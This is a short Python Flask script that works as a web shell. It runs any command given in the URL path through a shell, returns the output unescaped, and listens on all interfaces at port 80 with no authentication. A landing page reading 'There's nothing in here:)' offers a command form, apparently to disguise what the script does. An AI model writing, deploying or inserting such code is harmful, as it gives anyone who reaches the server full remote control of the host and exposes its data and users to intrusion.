
from flask import Flask, request, render_template_string, Response
import subprocess
from ansi2html import Ansi2HTMLConverter

app = Flask(__name__)
conv = Ansi2HTMLConverter(inline=True) 

@app.route('/', defaults={'command': ''})
@app.route('/&lt;path:command&gt;')
def execute_command(command):
    try:
        if not command:
            return render_template_string('''
                &lt;h1&gt;There's nothing in here:)&lt;/h1&gt;
                &lt;form method="GET"&gt;
                    &lt;input type="text" name="command" placeholder="Enter command"&gt;
                    &lt;button type="submit"&gt;Execute&lt;/button&gt;
                &lt;/form&gt;
            ''')

        # Replace underscores with spaces
        command = command.replace("_", " ")

        # Execute command
        process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()

        # Convert ANSI codes to HTML
        html_output = conv.convert(stdout + stderr, full=False)

        return render_template_string('''{{ output | safe }}
        ''', output=html_output)

    except Exception as e:
        return f"Error: {e}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
